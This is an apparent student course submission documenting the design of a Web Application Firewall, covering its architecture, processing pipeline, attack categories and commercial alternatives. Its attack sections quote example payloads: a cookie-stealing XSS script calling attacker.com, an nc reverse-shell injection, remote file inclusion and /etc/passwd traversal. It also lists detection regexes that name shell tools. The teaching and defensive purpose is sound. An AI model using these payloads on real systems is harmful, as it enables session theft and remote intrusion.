# Web Application Firewall (WAF) - Project Documentation
## IT360 Cyber Security Course - First Submission

**Group Members:** [mohamed nidhal el moulaa , wassef bellila , chaima sleimi , alaa dbira]  
**Project:** Project 7 - Web Application Firewall   
**Date:** April 2026

---

## Table of Contents
1. [Introduction](#introduction)
2. [Core Concepts and Architecture](#core-concepts-and-architecture)
3. [Main Components](#main-components)
4. [Functional Flow](#functional-flow)
5. [Attack Types and Protection Mechanisms](#attack-types-and-protection-mechanisms)
6. [Overview of Existing Solutions](#overview-of-existing-solutions)
7. [References](#references)

---

## 1. Introduction

### 1.1 What is a Web Application Firewall?

A Web Application Firewall (WAF) is a security solution that operates at the application layer (Layer 7 of the OSI model) to protect web applications from a wide range of attacks. Unlike traditional network firewalls that operate at lower layers and focus on IP addresses and ports, a WAF inspects the actual HTTP/HTTPS traffic content, analyzing requests and responses to identify and block malicious patterns.

### 1.2 Why WAFs are Critical

Modern web applications face sophisticated threats that traditional security measures cannot address:
- **SQL Injection attacks** can compromise entire databases
- **Cross-Site Scripting (XSS)** can steal user credentials and session tokens
- **Cross-Site Request Forgery (CSRF)** can execute unauthorized actions
- **File Inclusion attacks** can expose sensitive server files
- **DDoS attacks** can render applications unavailable

According to OWASP (Open Web Application Security Project), these vulnerabilities consistently rank among the top 10 security risks, making WAFs an essential component of defense-in-depth strategies.

### 1.3 Project Objectives

Our WAF implementation aims to:
1. Provide real-time protection against OWASP Top 10 vulnerabilities
2. Implement intelligent traffic filtering and anomaly detection
3. Create a logging and monitoring dashboard for security events
4. Demonstrate practical understanding of web security principles
5. Build a scalable, modular architecture for future enhancements

---

## 2. Core Concepts and Architecture

### 2.1 Defense-in-Depth Strategy

A WAF operates as part of a layered security approach:

```
┌─────────────────────────────────────────┐
│         Internet / Attackers            │
└─────────────────┬───────────────────────┘
                  │
         ┌────────▼────────┐
         │  Network FW     │ (Layer 3/4 - IP/Port filtering)
         └────────┬────────┘
                  │
         ┌────────▼────────┐
         │      WAF        │ (Layer 7 - HTTP/HTTPS inspection) ◄── OUR PROJECT
         └────────┬────────┘
                  │
         ┌────────▼────────┐
         │  Web Server     │ (Apache, Nginx, IIS)
         └────────┬────────┘
                  │
         ┌────────▼────────┐
         │  Application    │ (Backend logic)
         └────────┬────────┘
                  │
         ┌────────▼────────┐
         │    Database     │
         └─────────────────┘
```

### 2.2 WAF Deployment Modes

**1. Reverse Proxy Mode (Our Implementation)**
```
Client → WAF (Proxy) → Backend Server
```
- WAF sits between client and server
- All traffic passes through WAF
- Can modify requests and responses
- **Advantages:** Complete traffic visibility, ability to block before reaching server
- **Disadvantages:** Single point of failure (mitigated with clustering)

**2. Transparent Bridge Mode**
```
Client → WAF (Monitor) → Backend Server
```
- WAF monitors traffic passively
- No IP address changes required
- Used for monitoring and logging only

**3. Embedded/Agent Mode**
```
WAF runs as module within web server
```
- Examples: ModSecurity as Apache/Nginx module
- Lower latency
- Harder to bypass

### 2.3 Detection Methodologies

**Signature-Based Detection (Blacklist Approach)**
- Matches known attack patterns using regular expressions
- Fast and accurate for known threats
- Example: Detecting `UNION SELECT` in SQL injection attempts
- **Limitation:** Cannot detect zero-day attacks or novel variations

**Anomaly-Based Detection (Whitelist Approach)**
- Learns normal traffic behavior
- Flags deviations from baseline
- Can detect unknown attacks
- **Limitation:** Higher false positive rate during learning phase

**Hybrid Approach (Our Implementation)**
- Combines both methodologies
- Uses signatures for known attacks + anomaly detection for unknowns
- Adaptive learning over time

---

## 3. Main Components

### 3.1 Traffic Interceptor

**Purpose:** Captures all incoming HTTP/HTTPS requests before they reach the backend.

**Key Features:**
- Socket-level connection handling
- SSL/TLS termination (for HTTPS inspection)
- Connection pooling for performance
- Request buffering for inspection

**Technical Details:**
```
1. Client initiates connection
2. WAF accepts connection on port 80/443
3. WAF terminates SSL (if HTTPS)
4. Request is buffered in memory for inspection
5. If clean → forward to backend
6. If malicious → block and log
```

### 3.2 Request Parser & Normalizer

**Purpose:** Breaks down HTTP requests into analyzable components.

**Parsing Components:**
- **Request Line:** Method (GET/POST), URI, HTTP version
- **Headers:** Host, User-Agent, Content-Type, Cookies, etc.
- **Body:** POST data, JSON payloads, multipart forms
- **Query Parameters:** URL-encoded values

**Normalization Process:**
Attackers use encoding tricks to bypass filters. Normalization handles:

| Evasion Technique | Example | Normalized Form |
|-------------------|---------|-----------------|
| URL Encoding | `%27%20UNION%20SELECT` | `' UNION SELECT` |
| Double Encoding | `%2527` | `'` |
| Case Variation | `UnIoN SeLeCt` | `union select` |
| Unicode Encoding | `\u0027` | `'` |
| HTML Entity | `&#39;` | `'` |
| Null Byte | `admin%00.jpg` | `admin` |

### 3.3 Security Rules Engine

**Purpose:** Core decision-making component that applies security policies.

**Rule Structure:**
```
Rule ID: 100001
Phase: Request Headers
Pattern: User-Agent: .*sqlmap.*
Action: BLOCK
Severity: CRITICAL
Message: "SQL injection tool detected"
```

**Rule Categories:**

**A. Protocol Validation Rules**
- HTTP RFC compliance
- Invalid methods (TRACE, TRACK)
- Malformed headers
- Oversized requests

**B. Attack Signature Rules**
- SQL Injection patterns
- XSS vectors
- Path traversal attempts
- Command injection
- LDAP injection

**C. Rate Limiting Rules**
- Requests per IP per minute
- Login attempt throttling
- API endpoint rate limits

**D. Behavioral Rules**
- Unusual parameter counts
- Rapid session changes
- Geographic anomalies

### 3.4 Threat Intelligence Database

**Purpose:** Central repository of attack patterns and malicious indicators.

**Data Sources:**
- OWASP Core Rule Set (CRS)
- CVE database integration
- Known malicious IP lists
- Botnet command & control IPs
- Tor exit nodes (optional blocking)

**Database Schema:**
```
Signatures Table:
- signature_id
- attack_type (SQLi, XSS, etc.)
- pattern (regex/string)
- severity_score
- last_updated

IP Reputation Table:
- ip_address
- reputation_score (-100 to +100)
- country_code
- first_seen
- attack_count

Attack Vectors Table:
- vector_id
- payload
- attack_family
- exploitation_date
```

### 3.5 Response Analyzer

**Purpose:** Inspects server responses to prevent data leakage.

**Checks Performed:**
- Sensitive data patterns (credit cards, SSNs)
- Error messages revealing system info
- Directory listings
- Database error stacktraces
- Session tokens in URLs

**Data Loss Prevention (DLP):**
```
Pattern: \b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b
Action: Mask credit card numbers in responses
Output: XXXX-XXXX-XXXX-1234
```

### 3.6 Logging & Monitoring System

**Purpose:** Records security events for analysis and compliance.

**Log Levels:**
- **DEBUG:** Detailed traffic analysis
- **INFO:** Normal operations, rule matches
- **WARNING:** Suspicious patterns (not blocked)
- **CRITICAL:** Blocked attacks
- **ALERT:** Coordinated attack patterns

**Log Format (JSON):**
```json
{
  "timestamp": "2026-04-21T14:32:11Z",
  "event_id": "WAF-2026-04-21-98234",
  "source_ip": "192.168.1.100",
  "request_uri": "/admin/login.php",
  "attack_type": "SQL_INJECTION",
  "matched_rule": "100045",
  "payload": "admin' OR '1'='1",
  "action_taken": "BLOCKED",
  "severity": "CRITICAL",
  "user_agent": "Mozilla/5.0...",
  "geolocation": "TN"
}
```

### 3.7 Management Dashboard

**Purpose:** Provides real-time visibility and control.

**Dashboard Modules:**
- **Live Traffic Monitor:** Real-time request visualization
- **Attack Heatmap:** Geographic attack sources
- **Rule Performance:** Hit rates, false positives
- **Threat Analytics:** Attack type distribution
- **Configuration Panel:** Enable/disable rules
- **Whitelist Management:** Trusted IPs/paths

---

## 4. Functional Flow

### 4.1 Request Processing Pipeline

```
┌──────────────────────────────────────────────────────────────┐
│ PHASE 1: CONNECTION ESTABLISHMENT                             │
└───────────────────────┬──────────────────────────────────────┘
                        │
                        ▼
         ┌──────────────────────────┐
         │  Accept TCP Connection   │
         │  SSL/TLS Handshake       │
         └──────────┬───────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 2: REQUEST RECEPTION & PARSING                          │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Buffer Complete Request  │
         │ Parse HTTP Components    │
         │ Extract: Method, URI,    │
         │ Headers, Body, Cookies   │
         └──────────┬───────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 3: NORMALIZATION                                        │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ URL Decode               │
         │ HTML Entity Decode       │
         │ Unicode Normalization    │
         │ Case Normalization       │
         │ Remove Null Bytes        │
         └──────────┬───────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 4: PROTOCOL VALIDATION                                  │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Check HTTP Version       │
         │ Validate Method          │
         │ Header Size Limits       │
         │ Content-Type Validation  │
         └──────────┬───────────────┘
                    │
                    ├─────[INVALID]────┐
                    │                  │
                [VALID]                ▼
                    │         ┌────────────────┐
                    │         │ Return 400 Bad │
                    │         │    Request     │
                    │         └────────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 5: SIGNATURE DETECTION                                  │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Run All Active Rules:    │
         │                          │
         │ • SQL Injection          │
         │ • XSS Detection          │
         │ • Path Traversal         │
         │ • Command Injection      │
         │ • File Inclusion         │
         │ • CSRF Token Check       │
         └──────────┬───────────────┘
                    │
                    ├─────[MATCH]──────┐
                    │                  │
              [NO MATCH]               ▼
                    │         ┌────────────────┐
                    │         │ Log Attack     │
                    │         │ Block Request  │
                    │         │ Return 403     │
                    │         └────────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 6: ANOMALY DETECTION                                    │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Calculate Anomaly Score: │
         │                          │
         │ • Request size           │
         │ • Parameter count        │
         │ • Character distribution │
         │ • Request frequency      │
         │ • Session behavior       │
         └──────────┬───────────────┘
                    │
                    ├─[SCORE > THRESHOLD]──┐
                    │                       │
            [SCORE NORMAL]                  ▼
                    │              ┌────────────────┐
                    │              │ Flag Suspicious│
                    │              │ Log + Monitor  │
                    │              └────────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 7: RATE LIMITING CHECK                                  │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Check Request Count:     │
         │ • Per IP                 │
         │ • Per Session            │
         │ • Per Endpoint           │
         └──────────┬───────────────┘
                    │
                    ├─────[EXCEEDED]───┐
                    │                  │
              [WITHIN LIMIT]           ▼
                    │         ┌────────────────┐
                    │         │ Return 429 Too │
                    │         │  Many Requests │
                    │         └────────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 8: REQUEST FORWARDING                                   │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Forward to Backend:      │
         │ • Establish connection   │
         │ • Send original request  │
         │ • Add WAF headers        │
         │   (X-WAF-Protected: True)│
         └──────────┬───────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 9: RESPONSE INSPECTION                                  │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Receive Backend Response │
         │ Scan for:                │
         │ • Sensitive data leaks   │
         │ • Error message exposure │
         │ • Directory listings     │
         └──────────┬───────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│ PHASE 10: RESPONSE DELIVERY                                   │
└───────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────────┐
         │ Return Response to Client│
         │ Close Connection         │
         │ Update Metrics           │
         └──────────────────────────┘
```

### 4.2 Attack Detection Example: SQL Injection

**Scenario:** Attacker attempts to bypass login

**Attack Request:**
```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=anything
```

**WAF Processing Steps:**

1. **Normalization:** 
   - Input: `admin' OR '1'='1`
   - Already in plain text, no encoding

2. **Signature Matching:**
   ```
   Pattern: (?i)(union|select|insert|update|delete|drop|create|alter|exec|script|javascript|onerror)
   Match Found: "OR '1'='1" matches SQL tautology pattern
   ```

3. **Anomaly Scoring:**
   - Quote characters in username: +20 points
   - SQL keywords detected: +50 points
   - **Total Score: 70 (Threshold: 50) → BLOCK**

4. **Action:**
   ```
   HTTP/1.1 403 Forbidden
   X-WAF-Block-Reason: SQL Injection Attempt Detected
   X-WAF-Rule-ID: 942100
   
   Attack blocked by Web Application Firewall
   ```

5. **Logging:**
   ```json
   {
     "attack_type": "SQL_INJECTION",
     "payload": "admin' OR '1'='1",
     "matched_pattern": "SQL_TAUTOLOGY",
     "source_ip": "192.168.1.50",
     "blocked": true
   }
   ```

---

## 5. Attack Types and Protection Mechanisms

### 5.1 SQL Injection (SQLi)

**Attack Description:**  
Injection of malicious SQL code into application queries to manipulate database operations.

**Common Patterns:**
- `' OR '1'='1`
- `UNION SELECT * FROM users`
- `; DROP TABLE users--`
- `admin'--` (comment-based bypass)

**WAF Protection Strategy:**
```
Detection Rules:
1. Regex for SQL keywords: (union|select|insert|update|delete|drop)
2. Quote escape detection: \\'|''|\"
3. Comment sequence detection: --|#|/*
4. SQL function detection: concat|substring|ascii|char

Normalization:
- Decode URL encoding
- Remove whitespace variations
- Lowercase conversion

Blocking:
- Pattern match → Block + Log
- Anomaly score > threshold → Challenge (CAPTCHA)
```

### 5.2 Cross-Site Scripting (XSS)

**Attack Description:**  
Injection of malicious scripts into web pages viewed by other users.

**XSS Types:**

**Stored XSS:**
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Reflected XSS:**
```
http://victim.com/search?q=<script>alert(1)</script>
```

**DOM-based XSS:**
```javascript
document.location = 'javascript:alert(1)'
```

**WAF Protection Strategy:**
```
Detection Rules:
1. Script tag detection: <script|<iframe|<object|<embed
2. Event handler detection: onerror|onload|onclick
3. JavaScript protocol: javascript:|data:text/html
4. Encoded script tags: %3Cscript

Response Filtering:
- Content-Security-Policy header injection
- X-XSS-Protection: 1; mode=block
- Output encoding for reflected parameters
```

### 5.3 Cross-Site Request Forgery (CSRF)

**Attack Description:**  
Tricking authenticated users into executing unwanted actions.

**Attack Example:**
```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

**WAF Protection Strategy:**
```
1. CSRF Token Validation:
   - Check presence of anti-CSRF token in POST requests
   - Validate token matches session
   
2. SameSite Cookie Enforcement:
   - Rewrite cookies with SameSite=Strict attribute
   
3. Origin/Referer Header Validation:
   - Verify requests originate from same domain
   - Block mismatched origins
```

### 5.4 Path Traversal / Directory Traversal

**Attack Description:**  
Access files outside the web root directory.

**Attack Patterns:**
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd (double encoding bypass)
```

**WAF Protection Strategy:**
```
Detection:
1. Pattern: \.\./|\.\.\| (dot-dot-slash variations)
2. Encoded variants: %2e%2e%2f|%252e%252e%252f
3. Absolute path detection: /etc/|c:\|/proc/

Normalization:
- Canonicalize paths
- Remove duplicate slashes
- Decode all encoding layers
```

### 5.5 Remote File Inclusion (RFI) / Local File Inclusion (LFI)

**Attack Description:**  
Include malicious files in application execution.

**RFI Example:**
```
http://victim.com/index.php?page=http://attacker.com/shell.txt
```

**LFI Example:**
```
http://victim.com/index.php?file=/etc/passwd
```

**WAF Protection:**
```
Detection:
1. External URL in parameters: https?://
2. PHP wrappers: php://|data://|expect://|zip://
3. Null byte injection: %00

Blocking:
- Disallow external URLs in file parameters
- Whitelist allowed file extensions
- Validate file paths against allowed directories
```

### 5.6 Command Injection

**Attack Description:**  
Execute arbitrary OS commands through vulnerable inputs.

**Attack Examples:**
```
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | nc attacker.com 4444 -e /bin/bash
```

**WAF Protection:**
```
Detection:
1. Shell metacharacters: ;|&$`\n
2. Command keywords: cat|ls|wget|curl|nc|bash|sh
3. Pipe operations: ||&&
4. Redirection: >|<|>>

Blocking:
- Parameter validation (whitelist approach)
- Remove/escape shell metacharacters
```

### 5.7 HTTP Protocol Attacks

**HTTP Smuggling:**
```
Content-Length: 6
Transfer-Encoding: chunked

0

[Smuggled Request]
```

**HTTP Response Splitting:**
```
Location: http://example.com%0d%0aSet-Cookie: admin=true
```

**Protection:**
- Strict HTTP parsing
- Reject ambiguous requests
- Normalize headers

---

## 6. Overview of Existing Solutions

### 6.1 Open-Source Solutions

#### 6.1.1 ModSecurity

**Description:**  
The most widely deployed open-source WAF, originally created by Trustwave's SpiderLabs, now maintained by OWASP.

**Key Features:**
- Rule-based detection engine
- OWASP Core Rule Set (CRS) integration
- Can run as Apache/Nginx/IIS module
- Extensive logging capabilities
- SecRules DSL (Domain Specific Language)

**Architecture:**
```
Web Server (Apache/Nginx)
    │
    └─► ModSecurity Module
            │
            ├─► Request Processing Pipeline
            │       │
            │       ├─► Phase 1: Request Headers
            │       ├─► Phase 2: Request Body
            │       ├─► Phase 3: Response Headers
            │       ├─► Phase 4: Response Body
            │       └─► Phase 5: Logging
            │
            └─► Rule Engine (OWASP CRS)
```

**Deployment:**
```bash
# Apache Module
LoadModule security2_module modules/mod_security2.so
Include conf/owasp-crs/*.conf

# Nginx Module
load_module /usr/share/nginx/modules/ngx_http_modsecurity_module.so;
modsecurity on;
modsecurity_rules_file /etc/nginx/modsec/main.conf;
```

**Strengths:**
- ✅ Free and open-source
- ✅ Battle-tested in production environments
- ✅ Large community and rule repository
- ✅ Highly customizable

**Limitations:**
- ❌ Complex configuration
- ❌ Performance overhead on web server
- ❌ Learning curve for SecRules language

**Use Case:**  
Best for organizations needing a free, self-managed WAF solution with full control over rules.

---

#### 6.1.2 NAXSI (Nginx Anti-XSS & SQL Injection)

**Description:**  
A lightweight WAF module specifically designed for Nginx, focusing on simplicity and performance.

**Detection Approach:**  
Whitelist-based (positive security model) rather than blacklist.

**Key Features:**
- Score-based detection
- Low false positive rate
- Minimal performance impact
- Learning mode for whitelist generation

**Example Rule:**
```nginx
MainRule "str:--" "msg:sql comment (--)" "mz:BODY|URL|ARGS|$HEADERS_VAR:Cookie" "s:$SQL:4" id:1002;
```

**Strengths:**
- ✅ Very fast (optimized for Nginx)
- ✅ Simple syntax
- ✅ Learning mode reduces false positives

**Limitations:**
- ❌ Nginx-only (not portable)
- ❌ Smaller rule set than ModSecurity
- ❌ Less flexible for complex scenarios

---

#### 6.1.3 Shadow Daemon

**Description:**  
A modern WAF focusing on anomaly detection and machine learning.

**Unique Features:**
- Separate daemon process (not a web server module)
- Uses connectors for multiple languages (PHP, Perl, Python)
- Web-based management interface
- Automatic whitelist generation

**Architecture:**
```
Application → Connector → Shadow Daemon → Decision
                              │
                              ├─► Whitelist Rules
                              ├─► Blacklist Rules
                              └─► Machine Learning Model
```

**Strengths:**
- ✅ Language-agnostic
- ✅ Modern UI for management
- ✅ Intelligent learning capabilities

**Limitations:**
- ❌ Requires application-level integration
- ❌ Smaller community
- ❌ Less mature than ModSecurity

---

### 6.2 Commercial/Cloud Solutions

#### 6.2.1 Cloudflare WAF

**Description:**  
Cloud-based WAF integrated with Cloudflare's CDN and DDoS protection.

**Key Features:**
- Managed rulesets (OWASP Top 10, known CVEs)
- Custom rule engine with firewall rules
- Rate limiting and bot management
- Automatic rule updates
- Globally distributed edge network

**Rule Example:**
```
(http.request.uri.path contains "/admin" and ip.src.country ne "US")
```

**Pricing Model:**
- Free tier: Basic DDoS protection
- Pro ($20/month): Includes WAF
- Business ($200/month): Advanced WAF features
- Enterprise: Custom pricing

**Strengths:**
- ✅ Zero infrastructure management
- ✅ Scales automatically
- ✅ Combined DDoS + WAF protection
- ✅ Fast time-to-deployment

**Limitations:**
- ❌ Vendor lock-in
- ❌ Less control over rule customization
- ❌ Requires routing traffic through Cloudflare

---

#### 6.2.2 AWS WAF

**Description:**  
Amazon's managed WAF service integrated with CloudFront, ALB, and API Gateway.

**Key Features:**
- Pay-per-use pricing model
- Managed rule groups (AWS + Marketplace vendors)
- IP sets and regex pattern sets
- Rate-based rules
- Integration with AWS Shield for DDoS

**Pricing:**
```
Web ACLs: $5/month per ACL
Rules: $1/month per rule
Requests: $0.60 per million requests
```

**Rule Example (JSON):**
```json
{
  "Name": "BlockSQLi",
  "Priority": 1,
  "Statement": {
    "SqliMatchStatement": {
      "FieldToMatch": {
        "AllQueryArguments": {}
      },
      "TextTransformations": [{
        "Priority": 0,
        "Type": "URL_DECODE"
      }]
    }
  },
  "Action": { "Block": {} }
}
```

**Strengths:**
- ✅ Deep AWS ecosystem integration
- ✅ Serverless architecture
- ✅ Flexible pricing

**Limitations:**
- ❌ AWS-only
- ❌ Complex configuration via JSON
- ❌ Costs can escalate with high traffic

---

#### 6.2.3 Imperva (formerly Incapsula)

**Description:**  
Enterprise-grade cloud WAF with advanced threat intelligence.

**Key Features:**
- ThreatRadar™ reputation system
- Client classification engine
- Behavioral DDoS protection
- PCI-DSS and compliance support
- Account takeover protection

**Strengths:**
- ✅ Enterprise features (compliance, reporting)
- ✅ Strong threat intelligence
- ✅ Excellent support

**Limitations:**
- ❌ Expensive (enterprise-focused)
- ❌ Overkill for small applications

---

#### 6.2.4 F5 BIG-IP ASM (Application Security Manager)

**Description:**  
On-premise WAF solution deployed as hardware appliance or virtual edition.

**Key Features:**
- Comprehensive attack signature database
- Automatic policy building
- DataSafe (protects against MITB attacks)
- Integration with F5 load balancers
- Advanced behavioral analytics

**Deployment:**
- Hardware appliances
- Virtual Edition (VE)
- Cloud Edition (AWS, Azure, GCP)

**Strengths:**
- ✅ Extremely powerful and feature-rich
- ✅ High performance (hardware appliances)
- ✅ Full control (on-premise)

**Limitations:**
- ❌ Very expensive (hardware + licensing)
- ❌ Complex configuration
- ❌ Requires dedicated security team

---

### 6.3 Comparison Matrix

| Solution | Type | Deployment | Cost | Learning Curve | Best For |
|----------|------|------------|------|----------------|----------|
| **ModSecurity** | Open-Source | Module | Free | High | Self-managed, customizable |
| **NAXSI** | Open-Source | Nginx Module | Free | Medium | Nginx-specific, performance |
| **Shadow Daemon** | Open-Source | Standalone | Free | Medium | Multi-language apps |
| **Cloudflare WAF** | Cloud | SaaS | $20-200/mo | Low | Quick deployment, CDN users |
| **AWS WAF** | Cloud | Managed Service | Pay-per-use | Medium | AWS infrastructure |
| **Imperva** | Cloud | SaaS | $$$ | Low | Enterprise compliance |
| **F5 BIG-IP ASM** | Commercial | Appliance | $$$$ | High | Large enterprises, on-prem |

---

### 6.4 Industry Adoption Trends

**Statistics (2024-2026):**
- 68% of enterprises use cloud-based WAFs (Gartner)
- ModSecurity powers ~40% of self-hosted WAF deployments
- WAF market growing at 18% CAGR
- Average cost of a data breach: $4.45 million (IBM Security)

**Common Deployment Patterns:**
1. **Hybrid Approach:** Cloud WAF (Cloudflare/AWS) + ModSecurity for sensitive endpoints
2. **Defense-in-Depth:** WAF + IDS/IPS + RASP (Runtime Application Self-Protection)
3. **DevSecOps Integration:** WAF rules managed via Infrastructure-as-Code (Terraform)

---

### 6.5 Why Build Our Own WAF?

While robust commercial solutions exist, building a custom WAF provides:

1. **Deep Security Knowledge:** Understanding attack vectors at a granular level
2. **Customization:** Tailored rules for specific application architectures
3. **Cost Control:** No licensing fees for internal use
4. **Learning Experience:** Hands-on with HTTP protocol, regex, security patterns
5. **Integration Flexibility:** Easy to adapt to unique backend systems

**Our Implementation Goals:**
- Lightweight and fast (suitable for medium traffic)
- Modular architecture (easy to extend)
- Clear logging and monitoring
- Educational focus with production-ready concepts

---

## 7. References

### Academic Papers
1. Ristic, I. (2010). *ModSecurity Handbook*. Feisty Duck Ltd.
2. OWASP Foundation. (2021). *OWASP Top 10 - 2021*. Retrieved from https://owasp.org/Top10/
3. Bace, R., & Mell, P. (2001). *NIST Special Publication 800-31: Intrusion Detection Systems*.

### Technical Documentation
4. ModSecurity Project. *ModSecurity Reference Manual v3*. https://github.com/SpiderLabs/ModSecurity
5. OWASP CRS. *Core Rule Set Documentation*. https://coreruleset.org/docs/
6. Cloudflare. (2024). *WAF Managed Rules Documentation*. https://developers.cloudflare.com/waf/

### Industry Reports
7. Gartner, Inc. (2024). *Magic Quadrant for Web Application and API Protection*.
8. IBM Security. (2024). *Cost of a Data Breach Report 2024*.
9. Verizon. (2024). *Data Breach Investigations Report (DBIR)*.

### Web Security Standards
10. OWASP. *Web Application Security Testing Guide (WSTG)*.
11. NIST. (2020). *SP 800-95: Guide to Secure Web Services*.
12. W3C. *Content Security Policy Level 3*.

### Technical Blogs & Resources
13. PortSwigger. *Web Security Academy*. https://portswigger.net/web-security
14. Cloudflare Blog. *Under Attack: Insights on Web Application Security*.
15. AWS Security Blog. *Best Practices for AWS WAF*.

---

## Appendix A: Attack Signature Examples

### SQL Injection Patterns (Regex)
```regex
(?i)(union\s+select|select\s+from|insert\s+into|update\s+.+set|delete\s+from|drop\s+table)
(?i)(exec(\s|\+)+(s|x)p\w+)
(?i)(sleep\(|benchmark\(|waitfor\s+delay)
(?i)('|%27|&#39;|\u0027)(\s|%20)*(or|and)(\s|%20)*('|%27|&#39;|\u0027)(\s|%20)*(=|like)
```

### XSS Patterns (Regex)
```regex
(?i)(<script[^>]*>.*?</script>)
(?i)(on\w+\s*=\s*["\']?[^"\']*["\']?)
(?i)(javascript:|data:text/html|vbscript:)
(?i)(<iframe|<object|<embed|<applet)
(?i)(alert\(|confirm\(|prompt\(|console\.log\()
```

---

## Appendix B: Recommended Development Stack

**Backend (WAF Core):**
- **Language:** Python 3.11+ or Node.js 18+
- **Framework:** Flask/FastAPI (Python) or Express.js (Node.js)
- **HTTP Proxy:** mitmproxy library (Python) or http-proxy-middleware (Node.js)

**Database:**
- **Rules Storage:** PostgreSQL or MongoDB
- **Logging:** Elasticsearch + Kibana (ELK Stack)
- **Cache:** Redis (for rate limiting)

**Frontend (Dashboard):**
- **Framework:** React.js with Material-UI or Tailwind CSS
- **Visualization:** Chart.js or D3.js for attack analytics
- **Real-time Updates:** WebSockets or Server-Sent Events (SSE)

**DevOps:**
- **Containerization:** Docker + Docker Compose
- **CI/CD:** GitHub Actions
- **Testing:** pytest (Python) or Jest (Node.js)

---

**End of Submission Part 1**

*This document will be continuously updated as the project progresses. Next submission will include the High Level Design, implementation tools, and development phases.*
